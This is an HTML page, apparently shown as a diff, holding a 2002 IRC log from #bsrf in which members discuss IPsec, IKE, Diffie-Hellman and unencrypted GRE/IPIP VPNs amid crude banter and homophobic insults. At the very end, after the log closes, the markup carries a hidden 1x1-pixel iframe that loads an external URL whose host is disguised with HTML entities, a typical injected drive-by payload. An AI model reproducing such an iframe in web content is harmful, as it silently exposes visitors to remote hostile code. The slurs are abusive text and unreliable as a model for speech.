+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; also, you must use asymmetric 
+algorithms to exchange symmetric keys, which i think phaedrus was getting at in 
+his original comment</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; yea</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; not just for authentication</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i said that</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; b0ttyburp: shut the fuck up 
+d00d</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; lol</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- Chrome has quit (Ping timeout: 180 
+seconds)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; LOL :O) j/k</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; well, still didn't get into the 
+exchange of symmetric keys</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; its hard typing as much as i 
+did</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; (session keys)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- simprix has kicked phatal from #bsrf 
+(simprix)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; yea</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; phatal 
+(phatal@Ta5W3Z8Rgg6.bhm.bellsouth.net) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i discussed how</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; simprix whats your problem?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; Diffie-Hellman?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the hash sum is calculated to 
+verify the key</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;LiquidCrystalDismay&gt; have some democracy 
+simprix let ppl voice their opinion</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; 
+ftp://ftp.isi.edu/in-notes/rfc2409.txt</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; but how does the key get there in 
+the first place?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; is the RFC for IKE</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; phatal: piece... it was a good 
+lecture that is why... this channel need to be moderated to keep the flow 
+:O)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; well thats part of 
+diffie=hellman</P>
+<P style="MARGIN-BOTTOM: 0cm">&gt;LiquidCrystalDismay&lt; they can do that but 
+they need to be professional</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; no they need a differant channel to 
+do the lectures in</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; no we don't</P>
+<P style="MARGIN-BOTTOM: 0cm">* Phaedrus must have missed that part when he 
+moved</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; 
+Http://www.ietf.org/html.charters/ipsec-charter.html thats info on ipsec</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; we've always done the lectures in 
+this channel</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; we allways will do the lectures in 
+this channel</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; live with it and grow up</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;simprix&gt; i mean if someone things something 
+was wrong they can put in their own two sence but in a serious matter</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; 
+ftp://ftp.isi.edu/in-notes/rfc2401.txt</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- Ka0ticSH 
+(Ka0ticSH@6MVGs96CXVI.lsanca2.dsl-verizon.net) has left #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; that is the original IPSec RFC</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; most of the 2400's are ipsec 
+related</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; W4R (f3333@RWZCEj7UWes.nv.iinet.net.au) has 
+joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; rpc: thx for that :O)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; np</P>
+<P style="MARGIN-BOTTOM: 0cm">Phaedrus phatal phosphoric PhrostByte Phaedrus 
+phatal &lt;-- _Jonah_ has quit (Client Exiting)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; www.freeswan.org</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; um.....bye?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; is an IPSec implementation for 
+Linux</P>
+<P style="MARGIN-BOTTOM: 0cm">&gt;phatal&lt; why dont you stop talking shit in 
+#neworder</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; and other unixes</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; TLS!!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; there is racoon for BSD</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; which uses KAME i think</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; _Jonah_ 
+(joejoe@Eih7dZ1ioi6.stmnca.adelphia.net) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- scaal has quit (Ping timeout: 180 
+seconds)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; no KAME is the ipv6 code</P>
+<P style="MARGIN-BOTTOM: 0cm">&gt;phatal&lt; CTCP VERSION</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; i'm getting mixed up</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; look</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; grrr</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; wrong window</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; _bAss 
+(ffffffffff@qljb82PjWFA.b.003.syd.iprimus.net.au) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; no, i was right, KAME makes the 
+raccoon IKE engine</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_bAss&gt; ewww</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_bAss&gt; im in bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- _bAss 
+(ffffffffff@qljb82PjWFA.b.003.syd.iprimus.net.au) has left #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- W4R (f3333@RWZCEj7UWes.nv.iinet.net.au) has 
+left #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; i'm so content reading what you 
+guys type lol</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- PhrostByte has quit ()</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; well.. jonah.. even though I 
+wasn't here for the lecture</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; thanks for giving it</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; vpnd is sort of a neat vpn for 
+linux</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; it's not ipsec</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; but it supports some neato algorithms 
+like twofish</P>
+<P style="MARGIN-BOTTOM: 0cm">* Ralph slaps SpiderMan around a bit with a large 
+trout</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; instead of 3des crap</P>
+<P style="MARGIN-BOTTOM: 0cm">* Ralph slaps SpiderMan around a bit with a large 
+trout</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- nitrate2k 
+(e@ch.and.everyone.of.us.deserves.a.slice.of.cheez) has left #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ipsec is the public implementation 
+of VPN</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; Bruce Schneier represent!!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; onefish twofish? redfish 
+bluefish?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; theres man different proprietary 
+versions</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; ipsec isn't an implementation</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; it's a standard</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; VPN is a theory</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; yup ^^^^</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the statndard is public no?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; blowfish!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; rfc2401</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; nofish?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; blowfish glowfish?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; blowfish encryption!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; serpent!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; duh.</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; lol</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; IPsec is implement in windows, 
+this was be4 they sort it out proper... humm just like bill@shit4brain.gates 
+:O)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; IPsec is not for Windows.</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; anyways night guys</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; there are IPSec implementations for 
+Windows.</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; it has got it?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; yes</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; I think....</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; I'm going to stick with networking 
+basics</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; LOL ^</P>
+<P style="MARGIN-BOTTOM: 0cm">* Phaedrus has an exam on this stuff in two 
+days</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; give me a crimper... give me a 
+jack.. I'll show you... how to make cable... in a flash</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; LOL ^</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; white orange, orange, white green, 
+blue, white blue, green, white brown, brown</P>
+<P style="MARGIN-BOTTOM: 0cm">* bluhayz is all about the routing basics.. like.. 
+RIP and....</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; twisted or sheilded.. its up to 
+you give me the same and it will be pooh :O0</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; lol</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; anyways</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; _Jonah_ when you said RIP thats 
+a interoer routing protocol...?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; &lt;simprix&gt; well VPNs use 
+crypto</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; lol</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; duh.</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; no</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; no?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- trinity has quit (Ping timeout: 180 
+seconds)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; yea its interior</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; VPN do use encrption!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; VPNs</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; fheww me thought i'd lost it 
+:O)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; they kind've have to don't 
+they?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; yeah....that's the 'virtual' and 
+'private' part</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; conceptually</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; yea</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; Phaedrus: thx now i get it</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; anyways</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz&gt; I'm out to bed</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; so did you guys learn 
+anything?</P>
+<P style="MARGIN-BOTTOM: 0cm">--- bluhayz is now known as bluhayz|bed</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; any critiques?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; i did very much so</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; _jonah_ you just did a lecture on 
+VPNs and you said "no" when I said VPNs use crypto</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; how can i make the next one 
+better.</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; yes ur a b4d spelller :O)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; c0ld: VPN theory does</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; but the logical connection 
+doesnt</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; WTF?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; _Jonah_: Um...brush up on 
+crypto....have your terms defined ahead of time....don't promise to explain 
+things later</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; VPNs use crypto!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the p2p does</P>
+<P style="MARGIN-BOTTOM: 0cm">* Chris is back (gone 00:23:05)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; p2p sux my nutz!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; the p2p doesnt VPN does</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; well</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; thats what i mean</P>
+<P style="MARGIN-BOTTOM: 0cm">* Phaedrus should give a lecture on crypto...</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; technically speaking</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Chris&gt; dude</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; you can create a VPN using GRE</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; and GRE doesn't use encryption</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Ralph&gt; rpc should give a lecture on 
+crypto...</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; Phaedurs plz do!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Mikkkeee&gt; yo someone set up a server</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Chris&gt; if p2p sucks you'd be really 
+disappointed</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz|bed&gt; lol</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Mikkkeee&gt; for a live hack lecture</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; rpc: i never said it does</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; _jonah_: i know</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; Mikkkeee server for what&gt;</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; ?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Chris&gt; Mikkkeee: we talked about this</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Mikkkeee&gt; for a live hack lecture</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; ^^^ ???</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; ok.</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; IPIP also can be used to create 
+crypto-less VPN's</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; holy shit</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; Phaedrus: yea, well i dunno, i 
+wanted to discus crypto but in the same token i didnt want the convo to get 
+taken over by it</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; plus i only know the fudamentals 
+of it</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; b0ttyburp got the '^^^^^^"s goin 
+again</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; irc.rewted.org #hack</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; there we go</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; phatal: :O)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; Phaedrus: i would love for you to 
+give one</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; alright....then next time skip 
+the part about the Caesearian cipher (which was actually a permutation cipher as 
+you described it)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; alright, we'll see about the 
+crypto lecture....maybe in a week or two</P>
+<P style="MARGIN-BOTTOM: 0cm">Phaedrus phatal &lt;Phaedrus&gt; unless somebody 
+else really wants to do it sooner</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;LiquidCrystalDismay&gt; i got a surprise</P>
+<P style="MARGIN-BOTTOM: 0cm">&gt;Phaedrus&lt; let me know</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; well i said there are essential 
+two types symetric/asymetric</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;LiquidCrystalDismay&gt; phatal's gonna do a 
+lecture everybody!!!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; VPNs use encryption _Jonah_</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Mikkkeee&gt; simprix fix the lecture and email 
+it to me</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; HELL NO</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; c0ld: </P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; c0ld: i just gave you two examples 
+that do'nt.</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; rpc:</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; c0ld: GRE and IPIP</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; c0ld: U asked me earlier about p2p 
+and i said no encryption for that</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; create VPN's without encryption.</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; pay attention.</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;rpc&gt; or shut the fuck up</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;simprix&gt; if anyone would like to do a 
+lecture they can email me at simprix@simprix.net</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; LCD is gonna do a lecture on how to 
+be gay </P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; anyone want my lecture outline</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;LiquidCrystalDismay&gt; can i also sign u upto 
+spam porn?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Chris&gt; simpy who hosts you ?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Chris&gt; df ?</P>
+<P style="MARGIN-BOTTOM: 0cm">&gt;Chris&lt; what do you mean who hosts me</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- Psyko has quit (Ping timeout: 180 
+seconds)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Mikkkeee&gt; lol</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;simprix&gt; what?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;LiquidCrystalDismay&gt; thats easy i'd say 
+just get a camcorder and follow phatal around for the day</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; oh oh you think you are smart 
+huh</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; thats cute mr I live in NZ and I 
+fuck male sheep in the asshole</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; lol</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- Xinu (Snak@bUim1zhHbb6I.dyn.optonline.net) 
+has left #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; _bAss 
+(ffffffffff@qljb82PjWFA.b.003.syd.iprimus.net.au) has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">* bluhayz|bed thinks everyone here is a bunch of 
+weenies</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bluhayz|bed&gt; :-p</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; LOL</P>
+<P style="MARGIN-BOTTOM: 0cm">--- Phaedrus is now known as Phaedrus|Weenie</P>
+<P style="MARGIN-BOTTOM: 0cm">--- bluhayz|bed is now known as Bluhayz|IsLame</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- [PhaLanX] has quit (Connection timed 
+out)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; better to be a Weenie than to eat 
+Weenies</P>
+<P style="MARGIN-BOTTOM: 0cm">--- Phaedrus|Weenie is now known as Phaedrus</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Bluhayz|IsLame&gt; I'ma lame!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;simprix&gt; im out</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;LiquidCrystalDismay&gt; LOL</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; lol</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; later simprix</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; c ya sim</P>
+<P style="MARGIN-BOTTOM: 0cm">Phaedrus phatal &lt;simprix&gt; see ya phatal</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Bluhayz|IsLame&gt; l00k 4t m3 t4lk in my 1337 
+h4x0r t4xt......</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;simprix&gt; see ya c0ld</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Bluhayz|IsLame&gt; s33... I'm s0 l4m3</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; oh shit he got da leet speek</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; kill me now</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; alright....I'm going home</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Phaedrus&gt; bye</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Bluhayz|IsLame&gt; c-ya</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; later phaed</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- Phaedrus has quit (Client Exiting)</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bloppy-ph33r&gt; :/</P>
+<P style="MARGIN-BOTTOM: 0cm">--- Bluhayz|IsLame is now known as 
+Bluhayz|IsLame|bed</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; Psyko (PsykoDemun@2QT9ByBdekI.ipt.aol.com) 
+has joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;bloppy-ph33r&gt; 
+jonah!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</P>
+<P style="MARGIN-BOTTOM: 0cm">--- Bluhayz|IsLame|bed is now known as 
+Bluhayz|IsLame|Bed</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Bluhayz|IsLame|Bed&gt; there we go</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Bluhayz|IsLame|Bed&gt; the name says it 
+all</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Bluhayz|IsLame|Bed&gt; my name... what kind of 
+guy I am... and where I am</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Bluhayz|IsLame|Bed&gt; i use trojans</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Bluhayz|IsLame|Bed&gt; don't wanna get my girl 
+pregnant ya'know</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;phatal&gt; LCD |5 4 |_33T f4G455 \/\/|-|0 34T5 
+Tr3/\/\3nDous C0x</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;b0ttyburp&gt; ftp://80.192.156.123/read/ the 
+lecture if any1 wants it?</P>
+<P style="MARGIN-BOTTOM: 0cm">--&gt; MJ12 (new-web@7f3gSvYlKTQ.ipt.aol.com) has 
+joined #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_Jonah_&gt; ipt.aol.com :-D</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Bluhayz|IsLame|Bed&gt; hahahaha</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;LiquidCrystalDismay&gt; man thats pretty 1337 
+phatal</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;simprix&gt; funny isnt it</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Bluhayz|IsLame|Bed&gt; I know Digital 
+Fallout</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;simprix&gt; he isnt part of cDc</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Bluhayz|IsLame|Bed&gt; btw.. where the fuck is 
+he?</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;-- SpiderMan (SpiderMan@NIZ2cxYsTpo.o1.com) 
+has left #bsrf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Bluhayz|IsLame|Bed&gt; no he's not</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;_bAss&gt; i Is ElItZ0R!!!</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Bluhayz|IsLame|Bed&gt; he's cooler than 
+that</P>
+<P style="MARGIN-BOTTOM: 0cm">* Bluhayz|IsLame|Bed knows rek</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Bluhayz|IsLame|Bed&gt; rekaerf</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;Bluhayz|IsLame|Bed&gt; lol</P>
+<P style="MARGIN-BOTTOM: 0cm">&lt;c0ld&gt; STFU</P>
+<P style="MARGIN-BOTTOM: 0cm">**** ENDING LOGGING AT Tue Jul 9 01:04:48 
+2002</P><iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</BODY></HTML>
